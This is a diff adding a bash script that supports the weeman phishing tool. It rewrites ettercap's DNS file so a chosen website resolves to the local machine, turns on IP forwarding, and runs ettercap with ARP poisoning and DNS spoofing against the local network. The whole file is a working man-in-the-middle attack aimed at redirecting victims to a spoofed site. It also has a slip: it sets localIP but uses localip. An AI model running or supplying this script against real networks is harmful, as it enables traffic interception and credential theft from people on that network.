@@ -1,0 +1,44 @@
+#!/bin/bash
+#
+# Quick startup/stop script for weeman by @binkybear
+# https://github.com/Hypsurus/weeman
+#
+# $1 = Start/Stop
+# $2 = Interface
+# $3 = Website to spoof
+
+localIP=$(ifconfig $2 | grep "inet" | awk 'NR==1{print $2}')
+
+f_start(){
+
+# Backup ettercap DNS file
+cp /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak
+
+# Copy Website to etter.dns
+echo "${3}            A    ${localip}" > /etc/ettercap/etter.dns
+echo "*.${3}          A    ${localip}" >> /etc/ettercap/etter.dns
+echo "www.${3}        PTR  ${localip}" >> /etc/ettercap/etter.dns
+
+# Enable Forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Start ettercap with options: Text/Quiet/Interface/Plugin/MiTM
+ettercap -T -Q -i $2 -P dns_spoof -M arp &
+
+# Create ettercap pid
+echo $! > /tmp/ettercap_pid
+}
+
+f_stop(){
+cp /etc/ettercap/etter.dns.bak /etc/ettercap/etter.dns
+echo 0 > /proc/sys/net/ipv4/ip_forward
+kill -9 `cat /tmp/ettercap_pid`
+}
+
+if [[ $1 == "start" ]]; then
+	f_start
+fi
+
+if [[ $1 == "stop" ]]; then
+	f_stop
+fi
